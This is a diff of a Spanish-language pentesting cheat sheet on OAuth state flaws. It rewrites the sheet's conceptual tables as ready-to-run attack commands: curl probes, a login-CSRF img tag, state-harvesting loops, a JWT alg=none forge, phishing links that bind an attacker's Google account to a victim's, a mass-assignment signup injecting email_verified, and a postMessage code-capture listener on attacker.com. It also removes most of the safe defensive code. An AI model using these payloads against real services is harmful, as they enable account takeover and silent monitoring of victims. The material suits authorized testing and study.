@@ -23,71 +23,50 @@ linked:
 
 ## State Ausente
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Server no exige `state` o lo ignora. Habilita login CSRF clásico → cuenta atacante bindea a víctima. | CSRF de OAuth. |
-| Server emite code sin state | `/authorize?...` (sin `state=`) → returns code | Validation absent. |
-| Callback acepta sin state | `GET /cb?code=AAA` (sin state param) | Server processes code. |
-| State no validado vs session | Reusar state otro user en flow distinto | No session bind. |
-| State validado solo presence | `state=anything` aceptado | Fake validation. |
-| State no required en token endpoint | Code intercambiable sin state | Defense gap. |
-| State opcional en config | Toggle "require state" off por error | Misconfig. |
-| State validado solo en error path | Happy path no checkea | Logic flaw. |
-| State se descarta tras log | Usado solo for logging, no auth | Wrong intent. |
-| State en cookie pero no validado | Cookie present pero never compared | Implementation bug. |
-| State en frontend solo | Client-side check skippable | Trivial bypass. |
-| `nonce` confundido con `state` | Nonce ≠ state — propósitos distintos | Common dev mistake. |
+| `curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/cb&scope=email"` (sin `state=`) | Si emite code sin state → CSRF posible | Server no exige state. |
+| `curl -sI "https://target/cb?code=AAA"` (sin state param post-callback) | Si server procesa → callback no valida state | Validation absent. |
+| Capturar `state=BBB` legit + replay desde otra session: `curl https://target/cb?code=AAA&state=BBB` | Si acepta state cross-session → no bound a session | Reuse sin session bind. |
+| `state=anything` en authorize | Si pasa → presence-only validation | Fake validation. |
+| Login CSRF PoC: `<img src="https://target/oauth/start?...&state=ATTACKER_STATE">` | Forzar OAuth flow desde víctima's session | Login CSRF clásico. |
 ^oauth-state-absent
 
 ### Test state requirement
 
 ```bash
-# Test 1: Required en authorize?
-curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/cb&scope=email"
-# Si emite code sin state → vuln
+# 1. State requerido en authorize?
+curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/cb&scope=email" | grep -iE 'location|^HTTP'
+# 200/302 emitido sin state → vuln
 
-# Test 2: Validado en callback?
-# Capturar callback legit:
-GET /cb?code=AAA&state=BBB
-# Repetir sin state:
-GET /cb?code=AAA
-# Si server procesa → no validado
+# 2. Validado en callback?
+curl -sI "https://target/cb?code=AAA"  # sin state
+# 200 procesado → no validado
 
-# Test 3: Cross-user state
-# User1 inicia flow → captura state=USER1_STATE
-# User2 inicia flow → en callback usar state=USER1_STATE
-# Si acepta → no bound to session
+# 3. Cross-user state binding
+# User1 inicia → captura state_1
+# User2 callback con state_1 → si acepta = no bound a session
 ```
 
 ___
 
 ## State Predecible o Reusable
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | State presente pero implementación rota: predictable, reusable, leakeable. | Defense-in-name-only. |
-| State predecible | `state = md5(user_id + timestamp)` | Atacante predice. |
-| State estático | `state = "csrf_protection"` hardcoded | Reuse trivial. |
-| State sin entropía | `state = "1"`, `"2"`, increment | Brute force. |
-| State no rotado | Mismo state across sessions | Replay. |
-| State leak via Referer | State en URL post-callback → leak via Referer header | 3p analytics ven. |
-| State sin TTL | Válido para siempre | Replay días después. |
-| State no bound to user | Sirve para cualquier session | Cross-account binding. |
-| State client-side only | LocalStorage/cookie pero no server validation | Bypass. |
-| State validado en client (JS) | Frontend check, server confía | Modificable. |
-| State derivado de user input | Atacante influences derivation | Predictable. |
-| State weak HMAC | `HMAC(secret, "static")` con secret leaked | Replay. |
-| State JWT con `alg=none` | JWT-encoded state forgeable | JWT alg=none combo. |
-| State en URL fragment | Fragment leakable JS-side | XSS combo. |
-| State en GET param leakable | Logged en access logs, proxies | Privacy. |
-| State no rotated tras error | Failed auth → state still valid | Replay attempts. |
+| `for i in {1..100}; do curl -s "https://target/oauth/start?u=$i" \| grep -oE 'state=[^"&]+'; done \| sort -u` | Predecir patrón state | State derivado de input/incrementos. |
+| Capturar state hoy + replay mañana: `curl https://target/cb?code=AAA&state=$OLD_STATE` | Sin TTL → replay long-term | Server no expira state. |
+| `curl https://target/cb?code=AAA&state=csrf_protection` | Hardcoded state aceptado | State estático. |
+| `state=$(echo -n "user_id:1:1234567890" \| md5sum \| cut -d' ' -f1)` | State predecible MD5(user_id+ts) | Patrón clásico vulnerable. |
+| `state=$(jwt encode --alg none '{"u":1}')` | JWT-encoded state con `alg=none` | Forge state via JWT. |
+| Capturar state usado + replay en otro browser session | Replay cross-session | No session bind. |
+| Capturar state propio + enviar link con ese state a víctima | Login CSRF clásico | State no bound a víctima. |
 ^oauth-state-predictable
 
-### Patrones backend
+### Patrones state vulnerable (referencia)
 
 ```python
 # VULN — predecible
-import hashlib, time
 state = hashlib.md5(f"{user.id}{int(time.time())}".encode()).hexdigest()
 
 # VULN — estático
@@ -96,41 +75,27 @@ state = "csrf_protection"
 # VULN — increment
 state = str(get_next_oauth_state_id())
 
-# SAFE — token random + session bind
-import secrets
-state = secrets.token_urlsafe(32)  # 256 bits
+# SAFE — random + session bind + TTL
+state = secrets.token_urlsafe(32)
 session['oauth_state'] = state
 session['oauth_state_created'] = time.time()
-
-# Callback
-if request.args.get('state') != session.pop('oauth_state', None):
-    abort(403)
-if time.time() - session.pop('oauth_state_created', 0) > 600:  # 10 min TTL
-    abort(403)
 ```
 
 ___
 
 ## Account Binding Pre-Takeover
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Endpoint `/settings/link_oauth` no valida state. Atacante fuerza víctima a bindear su (atacante's) Google a cuenta víctima. | Persistent backdoor. |
-| Step 1: Atacante inicia flow propio | Registra app en Google con su cuenta | Pre-attack setup. |
-| Step 2: Captura code | Antes del callback víctima | Pre-callback intercept. |
-| Step 3: Construye link malicioso | `https://victim.com/oauth/link?code=ATACANTE_CODE` | Phishing payload. |
-| Step 4: Víctima logged in clickea | `link_oauth` endpoint procesa code | Accept any code. |
-| Step 5: Backend bindea Google atacante | `current_user.google_id = atacante_google_id` | Without re-auth/state. |
-| Step 6: Atacante login via "Sign in with Google" | Google atacante → cuenta víctima | ATO. |
-| Sin confirmación email | Bind no muestra email del provider antes commit | UI bug. |
-| Sin re-auth para bind | Endpoint no requiere password actual | Trust gap. |
-| Sin notificación email víctima | Víctima no se entera | Silent attack. |
-| Multiple providers chain | Bind Google + Facebook + GitHub atacante | Multi-vector persistence. |
-| Bind de unverified email match | Auto-bind si emails iguales (atacante's email = victim's) | Combo email squatting. |
-| OIDC `sub` vs email confusion | Bind usa `sub` pero matching usa email | Logic flaw. |
+| Iniciar OAuth flow propio en `victim.com` con tu Google → capturar `code` antes de callback | Code atacante listo para usar | Setup pre-attack. |
+| `<a href="https://victim.com/oauth/link?code=ATTACKER_CODE">Click here</a>` en phishing | Víctima logged-in clickea → bindea Google atacante a cuenta víctima | Endpoint `/link_oauth` sin state. |
+| Post-bind: login a `victim.com` con tu Google | ATO persistente | Backend usa Google ID atacante. |
+| Repetir bind con Facebook + GitHub atacante | Multi-provider persistence | Multi-vector. |
+| Si bind requiere email match: agregar email víctima como unverified en tu Google | Auto-bind triggered | Email-match logic. |
+| Post-bind, cambiar email cuenta a tu own en víctima.com | Persistent + email control | Lock-out víctima. |
 ^oauth-state-binding
 
-### Backend vulnerable
+### Backend vulnerable (referencia)
 
 ```python
 # Flask — VULN
@@ -140,116 +105,52 @@ def google_cb():
     google_user = exchange_code_for_user(code)  # = atacante's Google
     current_user.google_id = google_user['sub']  # ← bind sin state, sin re-auth
     db.commit()
-    flash('Google account linked!')
     return redirect('/dashboard')
 
-# SAFE
-@app.route('/auth/google/callback')
-def google_cb():
-    if request.args.get('state') != session.pop('oauth_state', None):
-        abort(403, 'invalid state')
-    code = request.args.get('code')
-    google_user = exchange_code_for_user(code)
-    if google_user.get('email_verified') is not True:
-        abort(400, 'email not verified by provider')
-    # Confirmation step
-    return render_template('confirm_link.html', provider_email=google_user['email'])
-# POST de confirm_link: requires password actual + sets google_id
+# Atacante PoC: phishing link a /auth/google/callback?code=$ATTACKER_CODE
 ```
 
 ___
 
 ## Pre-Account Takeover via Email
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Signup OAuth no verifica `email_verified` del provider. Atacante crea cuenta con email víctima en su Google (sin verificar) → registra en target → cuando víctima signup encuentra cuenta existente. | Pre-positioning. |
-| Atacante's Google add unverified email | Settings → Emails → Add `victim@target.com` (sin click verify) | Pre-attack setup. |
-| Atacante signup en target con su Google | Google envía email víctima en `email` claim, `email_verified=false` | Server should reject. |
-| Server crea cuenta atacante con email víctima | Si server confía email sin checkear `email_verified` | Vuln. |
-| Víctima intenta signup directo | "Email already exists" error | UX confuses. |
-| Víctima usa "Sign in with Google" | Loguea pero entra a cuenta atacante | Confusion. |
-| Atacante también puede login | Mismo Google account bindeado | Persistent. |
-| Booking-style classic bug | Históricamente vulnerable | Real example. |
-| Slack-style auto-merge | Same email auto-merge | Variant. |
-| Variant via SAML | SAML IdP no verified email | Adjacent. |
-| Variant via OIDC | id_token `email_verified=false` ignored | Same root. |
-| MFA bypass via OAuth signup | Cuenta nueva sin MFA enroll | Privilege escalation. |
-| Email change post-takeover | Atacante cambia email cuenta a su own | Persistent. |
-| `email_verified` toggle bug | Server permite false → true via parameter | Combo. |
-| Provider-specific quirks | Google, GitHub, FB tienen comportamientos distintos | Per-IdP. |
+| En tu Google: Settings → Emails → Add `victim@target.com` (sin click verify link) | Email unverified asociado a tu Google | Setup pre-attack. |
+| Signup en target con tu Google con email víctima en claim | Server crea cuenta atacante con email víctima | Server no checkea `email_verified`. |
+| Esperar víctima signup directo → "Email already exists" | Confusion → víctima usa "Sign in with Google" | Cae en cuenta atacante. |
+| Post-pretakeover: cambiar password de la cuenta target a uno conocido | Persistent control | Atacante mantiene Google + password. |
+| `curl https://target/api/signup -d '{"email":"victim@target.com","email_verified":true,"google_id":"..."}'` (si signup endpoint vulnerable) | Direct API pre-takeover | Mass Assignment + email_verified inject. |
 ^oauth-state-pretakeover
 
-### Defense check
+### Defense check (referencia)
 
 ```python
 # VULN
 def signup_oauth(google_token):
     user_info = decode(google_token)
-    user = User(email=user_info['email'], google_id=user_info['sub'])
-    db.session.add(user)
-    db.session.commit()
+    User.create(email=user_info['email'])  # acepta sin verificar
 
 # SAFE
 def signup_oauth(google_token):
     user_info = decode(google_token)
     if not user_info.get('email_verified'):
         abort(400, 'email not verified')
-    if not user_info.get('iss') == EXPECTED_ISSUER:
+    if user_info.get('iss') != EXPECTED_ISSUER:
         abort(400, 'invalid issuer')
-    # Force separate verification email even if provider says verified
-    send_verification_email(user_info['email'])
 ```
 
 ___
 
 ## Session Fixation via OAuth
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Atacante inicia flow propio, captura state + URL. Víctima clickea link, completa auth, queda logueada en cuenta atacante. | Reverse fixation. |
-| State no bound a victim's session | Atacante's state legit en víctima | Reuse. |
-| `prompt=none` con sesión preexistente | Si víctima ya logged in IdP → silent re-auth | Bypass UI. |
-| Auto-login on callback | Server loguea via code sin re-confirm | No interaction. |
-| `display=popup` + window.opener | Popup posteable a opener via postMessage | Cross-origin postMessage. |
-| Víctima sube data sensible | Asume es su cuenta | Data theft inverted. |
-| Atacante observa via "his" cuenta | Logged in concurrently | Persistent watch. |
-| Combine con password reset | Atacante "his" cuenta → reset password con email víctima | If email control. |
-| Combine con notification | Atacante triggers actions víctima ejecuta | Manipulation. |
-| Combine con webhook | Atacante's webhook recibe víctima's actions | Exfil. |
-| Same-IdP cross-app | Atacante's account on app A used to login app B as víctima | Mix-up combo. |
-| Stale session cookie | Víctima never logs out → continues using atacante account | Long-term. |
+| `curl "https://target/oauth/start?prompt=none&...&redirect_uri=...&state=ATTACKER_STATE"` | Silent login si víctima already auth en IdP | `prompt=none` aceptado. |
+| Capturar URL Google con `state=ATTACKER_STATE` + enviar a víctima | Víctima callback usa atacante's state | State no bound a víctima session. |
+| Pre-set session cookie atacante en víctima browser via XSS / subdomain takeover + iniciar OAuth flow | Víctima atrapada en sesión atacante | Combine con XSS. |
+| `display=popup` + listener postMessage en attacker.com | Captura code via window.opener | Popup-based flow vulnerable. |
+| Post-fixation: monitorear cuenta "atacante" para ver actividad víctima | Data exfil silent | Persistent watch. |
 ^oauth-state-fixation
-
-### Workflow fixation reverse
-
-```
-1. Atacante inicia flow OAuth → captura initial URL
-   GET https://target/oauth/start
-   → 302 https://google.com/authz?...&state=ATACANTE_STATE
-
-2. Atacante intercepta antes de su own click "Authorize"
-   Capture URL Google: https://google.com/authz?client_id=APP&...&state=ATACANTE_STATE
-
-3. Atacante envía URL a víctima ("Click acá para promo")
-
-4. Víctima clickea, ya logueada en Google → silent grant
-   Google → 302 https://target/cb?code=VICTIM_CODE&state=ATACANTE_STATE
-
-5. Server target valida state (es el que él/atacante seteó)
-   → exchange code → user_info Google víctima
-   → log víctima en cuenta SUYA (no atacante)
-   
-   ← Wait, here state validates ok for SOME user → if no session bind:
-   atacante's session expects to log in next, so cookie set en víctima's browser
-   logging víctima como atacante? Depends on impl.
-
-6. Realidad: si atacante envió SU state (originated en su browser), cookie
-   atacante's session vive en su browser. Víctima clickea desde víctima browser
-   → cookie distinta. Realidad: víctima loguea como víctima.
-
-   Para fixation REAL: atacante necesita que cookie de session viaje en víctima's browser.
-   Variante: atacante presetea cookie via subdomain takeover o XSS.
-```
 
 ***
